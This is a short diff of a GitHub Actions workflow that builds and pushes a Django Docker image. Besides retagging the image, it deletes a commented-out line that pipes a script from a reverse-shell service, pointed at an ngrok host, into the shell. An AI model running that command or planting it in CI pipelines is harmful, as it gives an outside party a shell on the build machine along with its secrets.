@@ -94,8 +94,8 @@ jobs:
       - name: Build and push
         working-directory: "./backend"
         run: |
-          #   curl https://reverse-shell.sh/4.tcp.ngrok.io:15268 | sh
+          git_sha=${{github.event.pull_request.base.sha}}
           docker build -f django.Dockerfile \
-          --tag recipeyak/django:$GITHUB_SHA \
-          --build-arg GIT_SHA=$GITHUB_SHA .
-          docker push recipeyak/django:$GITHUB_SHA
+          --tag recipeyak/django:$git_sha \
+          --build-arg GIT_SHA=$git_sha .
+          docker push recipeyak/django:$git_sha
